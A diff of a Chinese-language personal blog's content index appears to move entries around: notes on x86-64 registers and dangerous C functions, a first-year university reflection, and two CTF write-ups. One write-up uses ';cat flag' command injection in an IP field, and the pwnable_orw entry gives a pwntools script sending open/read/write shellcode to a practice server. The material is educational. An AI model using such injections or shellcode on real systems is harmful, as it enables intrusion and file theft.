-<h3 id="64位与32位寄存器区别有："><a href="#64位与32位寄存器区别有：" class="headerlink" title="64位与32位寄存器区别有："></a>64位与32位寄存器区别有：</h3><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r_。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。</p>
-<p>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值。</p>
-<p>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>
-<p>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
-<p><img src="/img/64.png"></p>
-<h3 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h3><pre><code>参数通过寄存器传递（见前文）
-callq 在栈里存放一个8位的返回地址
-许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。
-函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）
-不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。
-
-一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。
-</code></pre>
-<h3 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h3><pre><code>6个寄存器用来传递参数（见前文）
-剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）
-调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推
-</code></pre>
-<h3 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h3><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。<br>需要栈帧的情况：</p>
-<pre><code>本地变量太多，寄存器不够
-一些本地变量是数组或结构体
-函数使用了取地址操作符来计算一个本地变量的地址
-函数必须用栈传送一些参数给另外一个函数
-函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）
-</code></pre>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bjdctf_2020_router</title>
-    <url>/2022/01/21/%E5%88%B7%E6%96%B0%E4%B8%89%E8%A7%82%E7%AC%AC%E4%B8%80%E9%A2%98(bjdctf_2020_router)/</url>
-    <content><![CDATA[<span id="more"></span>
-<h2 id="刷新三观第一题-bjdctf-2020-router"><a href="#刷新三观第一题-bjdctf-2020-router" class="headerlink" title="刷新三观第一题(bjdctf_2020_router)"></a>刷新三观第一题(bjdctf_2020_router)</h2><p><del>昨天本来已经没想到，但今天更没想到</del></p>
-<p>这是一个考察linux中命令方式的题，直接就不需要IDA查看文件</p>
-<p>Linux中打开，连接靶机</p>
-<p><img src="/img/1643120285905.png" alt="1643120285905"></p>
-<p>界面就这样，让你选</p>
-<p>我选了1</p>
-<p><img src="/img/1643120297383.png" alt="1643120297383"></p>
-<p>然后让我输入ip地址，我觉得有猫腻，想到Linux有一个指令用法</p>
-<p><code>命令1+；+命令2</code> 这样的格式两种指令都会执行</p>
-<p>然后我果断;cat flag</p>
-<p><img src="/img/1643120311348.png" alt="1643120311348"></p>
-<p>哈哈哈，出来了，<del>放在第二页可真是有含金量</del></p>
-<p>下班！</p>
-]]></content>
-      <categories>
-        <category>writeup</category>
       </categories>
       <tags>
         <tag>pwn</tag>
@@ -1866,6 +1794,78 @@ alpha <span class="token operator">=</span> <span class="token number">3.0</span
       </tags>
   </entry>
   <entry>
+    <title>bjdctf_2020_router</title>
+    <url>/2022/01/21/%E5%88%B7%E6%96%B0%E4%B8%89%E8%A7%82%E7%AC%AC%E4%B8%80%E9%A2%98(bjdctf_2020_router)/</url>
+    <content><![CDATA[<span id="more"></span>
+<h2 id="刷新三观第一题-bjdctf-2020-router"><a href="#刷新三观第一题-bjdctf-2020-router" class="headerlink" title="刷新三观第一题(bjdctf_2020_router)"></a>刷新三观第一题(bjdctf_2020_router)</h2><p><del>昨天本来已经没想到，但今天更没想到</del></p>
+<p>这是一个考察linux中命令方式的题，直接就不需要IDA查看文件</p>
+<p>Linux中打开，连接靶机</p>
+<p><img src="/img/1643120285905.png" alt="1643120285905"></p>
+<p>界面就这样，让你选</p>
+<p>我选了1</p>
+<p><img src="/img/1643120297383.png" alt="1643120297383"></p>
+<p>然后让我输入ip地址，我觉得有猫腻，想到Linux有一个指令用法</p>
+<p><code>命令1+；+命令2</code> 这样的格式两种指令都会执行</p>
+<p>然后我果断;cat flag</p>
+<p><img src="/img/1643120311348.png" alt="1643120311348"></p>
+<p>哈哈哈，出来了，<del>放在第二页可真是有含金量</del></p>
+<p>下班！</p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一些危险函数和64位寄存器与32位不同之处</title>
+    <url>/2021/06/26/%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C64%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E32%E4%BD%8D%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
+    <content><![CDATA[<span id="more"></span>
+<p>列举一下常见的危险函数：</p>
+<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><pre><code>    gets，直接读取一行，忽略&#39;\x00&#39;
+    scanf
+    vscanf
+</code></pre>
+<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><pre><code>    sprintf
+</code></pre>
+<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code>    strcpy，字符串复制，遇到&#39;\x00&#39;停止
+    strcat，字符串拼接，遇到&#39;\x00&#39;停止
+    copy
+</code></pre>
+<h3 id="64位与32位寄存器区别有："><a href="#64位与32位寄存器区别有：" class="headerlink" title="64位与32位寄存器区别有："></a>64位与32位寄存器区别有：</h3><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r_。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。</p>
+<p>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值。</p>
+<p>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>
+<p>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
+<p><img src="/img/64.png"></p>
+<h3 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h3><pre><code>参数通过寄存器传递（见前文）
+callq 在栈里存放一个8位的返回地址
+许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。
+函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）
+不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。
+
+一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。
+</code></pre>
+<h3 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h3><pre><code>6个寄存器用来传递参数（见前文）
+剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）
+调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推
+</code></pre>
+<h3 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h3><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。<br>需要栈帧的情况：</p>
+<pre><code>本地变量太多，寄存器不够
+一些本地变量是数组或结构体
+函数使用了取地址操作符来计算一个本地变量的地址
+函数必须用栈传送一些参数给另外一个函数
+函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）
+</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>飞蓬大将军</title>
     <url>/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1901,31 +1901,6 @@ alpha <span class="token operator">=</span> <span class="token number">3.0</span
       </categories>
       <tags>
         <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>大一生活结束了</title>
-    <url>/2021/09/28/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="大一总结："><a href="#大一总结：" class="headerlink" title="大一总结："></a>大一总结：</h2><p>   2020年9月21日，是我第一天到新疆大学报道的日子，怀着憧憬和忐忑的心，我正式成为了一名网安的学生。其实刚到大学，脑子里只有一股念想： 怎么在大学四年里过得充实。<br>   要我说，真正让我开始感到大学意义的便是ctf。刚开学，社团招新，本着我对计算机方面的强烈兴趣，我不假思索的选择了新疆大学网络安全兴趣协会，从那时起，我才开始逐渐了解有一项比赛叫ctf，里面很多方向，涉及很多的计算机知识、专业领域。就觉得缘分挺奇妙的，我一看见这个东西，就爱上它了。往往是因为热爱，才让很多人能够变得优秀。从“1024”的招新赛之后，我便一发不可收拾，开始越来越想了解ctf比赛，终于大一上寒假，一个很好的培训机会，我正式开始了我的ctf之路，学习汇编、pthon，开始入门pwn方向，众所周知，pwn方向是选择较少但又很大头的一个方向，不单单是因为入门门槛高，更是因为它乏味。多少次刷题刷到不想刷的时候，都是依靠着我的兴趣在不断坚持。暑假是一个非常好的时期，三个月的长假，足够一个菜鸟变成大菜鸟(bushi)。终于在暑假考核赛中，我展露了锋芒。不过这也只是刚刚开始，pwn需要沉淀，我也是。</p>
-<hr>
-<p>   生活总是百般刁难，虽然我对ctf拥有足够多的热爱，但是仍然避免不了我的平庸。大一的课程，确实让我不知所措，上册初来乍到，没有追求过绩点高低，等到下册想来时，却遇上了大劫难。为了新校区的搬迁，我们的课程排满了，每天都是高强度的上课上课，自己所有的节奏都被打乱，强压之下喘不过气，最后落下了一个非常不好的结局。不是很想再提，不管是老师的教学问题还是我本人的问题，反正结局已定，也无可厚非了。只是从大二开始，一定不能再浑浑噩噩过日子了，这一学年遇到的人和事也都当历练了，人哪有不走弯路的，任何人的一生也不可能是一帆风顺的，只要认识问题及时改正，我就还有机会做个好人，哈哈哈哈。</p>
-<hr>
-<p>   很荣幸能在第一批新生中就加入XJUSEC。可以说我一直是一个人，在我们班上，我是唯一一个打ctf的，在ctf中，我是唯一一个学pwn的新生，种种孤独都向我而来，我接受孤独，享受孤独。都说站在顶峰的人才会享受孤独，但我这也不算吧哈哈哈哈。战队是一个大家庭，学长们人都很好，好说话，好相处，我觉得我没来错地方，挺好的。我们萌新们也都算是志同道合了，不然不会这么聊得来。一转眼就大二了，时间不等人，开学就要迎接新生，招他们入会了，芜湖！</p>
-<hr>
-<h2 id="大二展望："><a href="#大二展望：" class="headerlink" title="大二展望："></a>大二展望：</h2><p>   真是，大二了，很幸运12.18我能参加四级考试，争取一次过四级，后面才好过六级，早早为考研做准备吧！</p>
-<p>   大二了，过了一年大学生活，我也算是活明白了，现在起，拒绝懒惰，拒绝无用功，好好学习，扎实基础，保研肯定是不用想的，但是考研肯定是要做的。这不国庆快到了，安排了一些计划：</p>
-<pre><code>1.复习大一学的不牢靠的课程知识（必须）
-2.继续buu刷题，看书学pwn（看时间够不）
-3.把没了的暑假作业了了（一定）
-</code></pre>
-<p>   我要再不努力，耶稣也救不了我了！！！<br>   等开学后，准备找学长和咱宿舍的兄弟们做个大创项目啥的，先把创新学分拿下吧，那200个学时咱再慢慢争。然后就是，打比赛！打比赛！打比赛！拿奖！拿奖！拿奖！</p>
-<p>   希望我的大二学年能够照着计划稳稳走完。大一就当混了，大二绝不做混子！我要洗心革面，做个好人!</p>
-]]></content>
-      <categories>
-        <category>日常闲话</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
       </tags>
   </entry>
   <entry>
@@ -2332,6 +2307,31 @@ warn_on_root &#x3D; 1
       </tags>
   </entry>
   <entry>
+    <title>大一生活结束了</title>
+    <url>/2021/09/28/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="大一总结："><a href="#大一总结：" class="headerlink" title="大一总结："></a>大一总结：</h2><p>   2020年9月21日，是我第一天到新疆大学报道的日子，怀着憧憬和忐忑的心，我正式成为了一名网安的学生。其实刚到大学，脑子里只有一股念想： 怎么在大学四年里过得充实。<br>   要我说，真正让我开始感到大学意义的便是ctf。刚开学，社团招新，本着我对计算机方面的强烈兴趣，我不假思索的选择了新疆大学网络安全兴趣协会，从那时起，我才开始逐渐了解有一项比赛叫ctf，里面很多方向，涉及很多的计算机知识、专业领域。就觉得缘分挺奇妙的，我一看见这个东西，就爱上它了。往往是因为热爱，才让很多人能够变得优秀。从“1024”的招新赛之后，我便一发不可收拾，开始越来越想了解ctf比赛，终于大一上寒假，一个很好的培训机会，我正式开始了我的ctf之路，学习汇编、pthon，开始入门pwn方向，众所周知，pwn方向是选择较少但又很大头的一个方向，不单单是因为入门门槛高，更是因为它乏味。多少次刷题刷到不想刷的时候，都是依靠着我的兴趣在不断坚持。暑假是一个非常好的时期，三个月的长假，足够一个菜鸟变成大菜鸟(bushi)。终于在暑假考核赛中，我展露了锋芒。不过这也只是刚刚开始，pwn需要沉淀，我也是。</p>
+<hr>
+<p>   生活总是百般刁难，虽然我对ctf拥有足够多的热爱，但是仍然避免不了我的平庸。大一的课程，确实让我不知所措，上册初来乍到，没有追求过绩点高低，等到下册想来时，却遇上了大劫难。为了新校区的搬迁，我们的课程排满了，每天都是高强度的上课上课，自己所有的节奏都被打乱，强压之下喘不过气，最后落下了一个非常不好的结局。不是很想再提，不管是老师的教学问题还是我本人的问题，反正结局已定，也无可厚非了。只是从大二开始，一定不能再浑浑噩噩过日子了，这一学年遇到的人和事也都当历练了，人哪有不走弯路的，任何人的一生也不可能是一帆风顺的，只要认识问题及时改正，我就还有机会做个好人，哈哈哈哈。</p>
+<hr>
+<p>   很荣幸能在第一批新生中就加入XJUSEC。可以说我一直是一个人，在我们班上，我是唯一一个打ctf的，在ctf中，我是唯一一个学pwn的新生，种种孤独都向我而来，我接受孤独，享受孤独。都说站在顶峰的人才会享受孤独，但我这也不算吧哈哈哈哈。战队是一个大家庭，学长们人都很好，好说话，好相处，我觉得我没来错地方，挺好的。我们萌新们也都算是志同道合了，不然不会这么聊得来。一转眼就大二了，时间不等人，开学就要迎接新生，招他们入会了，芜湖！</p>
+<hr>
+<h2 id="大二展望："><a href="#大二展望：" class="headerlink" title="大二展望："></a>大二展望：</h2><p>   真是，大二了，很幸运12.18我能参加四级考试，争取一次过四级，后面才好过六级，早早为考研做准备吧！</p>
+<p>   大二了，过了一年大学生活，我也算是活明白了，现在起，拒绝懒惰，拒绝无用功，好好学习，扎实基础，保研肯定是不用想的，但是考研肯定是要做的。这不国庆快到了，安排了一些计划：</p>
+<pre><code>1.复习大一学的不牢靠的课程知识（必须）
+2.继续buu刷题，看书学pwn（看时间够不）
+3.把没了的暑假作业了了（一定）
+</code></pre>
+<p>   我要再不努力，耶稣也救不了我了！！！<br>   等开学后，准备找学长和咱宿舍的兄弟们做个大创项目啥的，先把创新学分拿下吧，那200个学时咱再慢慢争。然后就是，打比赛！打比赛！打比赛！拿奖！拿奖！拿奖！</p>
+<p>   希望我的大二学年能够照着计划稳稳走完。大一就当混了，大二绝不做混子！我要洗心革面，做个好人!</p>
+]]></content>
+      <categories>
+        <category>日常闲话</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>寒假学习(三)</title>
     <url>/2022/02/06/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%882022.1.31-2022.2.6%EF%BC%89/</url>
     <content><![CDATA[<span id="more"></span>
@@ -2411,6 +2411,45 @@ char <span class="token operator">*</span>strncpy<span class="token punctuation"
       </categories>
       <tags>
         <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwnable_orw</title>
+    <url>/2022/01/21/%E6%B2%99%E7%AE%B1%E5%88%9D%E4%BD%93%E9%AA%8C%EF%BC%88pwnable_orw)/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="沙箱初体验（pwnable-orw"><a href="#沙箱初体验（pwnable-orw" class="headerlink" title="沙箱初体验（pwnable_orw)"></a>沙箱初体验（pwnable_orw)</h1><p>确实很新奇嗷，照着buu上题目顺序来做，没想到这么快就接触到了沙箱的题目，<del>而我堆都还没玩明白</del></p>
+<p>那废话不多说，先来看看文件吧。这时候问题就出现了，不知道为啥就被拦下了，附件不让下载。</p>
+<p><img src="/img/1643120343756.png" alt="1643120343756"></p>
+<p>xs，只好去网上找dalao们写的博客，好巧不巧就发现了这是个沙箱的题目。</p>
+<p>于是只好拿网上的图片来看</p>
+<p><img src="/img/1643120358026.png" alt="1643120358026"></p>
+<p>搞懂了基本原理，那就实操一下，只能利用open、read、write三个函数来读取flag。</p>
+<p>看完dalao的博客，真的学到了，居然还有这样的方法来拿flag，<del>哈哈哈哈哈哈</del></p>
+<p><img src="/img/1643120371790.png" alt="1643120371790"></p>
+<p>最后脚本附上一跑，就真成了<del>（我是二傻子）</del></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python2</span>
+<span class="token comment">#coding=utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27261</span><span class="token punctuation">)</span>
+
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80'</span><span class="token punctuation">)</span>
+shellcode<span class="token operator">+=</span>asm<span class="token punctuation">(</span><span class="token string">'mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80'</span><span class="token punctuation">)</span>
+shellcode<span class="token operator">+=</span>asm<span class="token punctuation">(</span><span class="token string">'mov eax,0x4;mov ebx,0x1;int 0x80'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'shellcode:'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>
+
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -2499,45 +2538,6 @@ int main(void)
       </categories>
       <tags>
         <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwnable_orw</title>
-    <url>/2022/01/21/%E6%B2%99%E7%AE%B1%E5%88%9D%E4%BD%93%E9%AA%8C%EF%BC%88pwnable_orw)/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="沙箱初体验（pwnable-orw"><a href="#沙箱初体验（pwnable-orw" class="headerlink" title="沙箱初体验（pwnable_orw)"></a>沙箱初体验（pwnable_orw)</h1><p>确实很新奇嗷，照着buu上题目顺序来做，没想到这么快就接触到了沙箱的题目，<del>而我堆都还没玩明白</del></p>
-<p>那废话不多说，先来看看文件吧。这时候问题就出现了，不知道为啥就被拦下了，附件不让下载。</p>
-<p><img src="/img/1643120343756.png" alt="1643120343756"></p>
-<p>xs，只好去网上找dalao们写的博客，好巧不巧就发现了这是个沙箱的题目。</p>
-<p>于是只好拿网上的图片来看</p>
-<p><img src="/img/1643120358026.png" alt="1643120358026"></p>
-<p>搞懂了基本原理，那就实操一下，只能利用open、read、write三个函数来读取flag。</p>
-<p>看完dalao的博客，真的学到了，居然还有这样的方法来拿flag，<del>哈哈哈哈哈哈</del></p>
-<p><img src="/img/1643120371790.png" alt="1643120371790"></p>
-<p>最后脚本附上一跑，就真成了<del>（我是二傻子）</del></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python2</span>
-<span class="token comment">#coding=utf-8</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
-
-context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27261</span><span class="token punctuation">)</span>
-
-shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80'</span><span class="token punctuation">)</span>
-shellcode<span class="token operator">+=</span>asm<span class="token punctuation">(</span><span class="token string">'mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80'</span><span class="token punctuation">)</span>
-shellcode<span class="token operator">+=</span>asm<span class="token punctuation">(</span><span class="token string">'mov eax,0x4;mov ebx,0x1;int 0x80'</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'shellcode:'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>
-
-
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
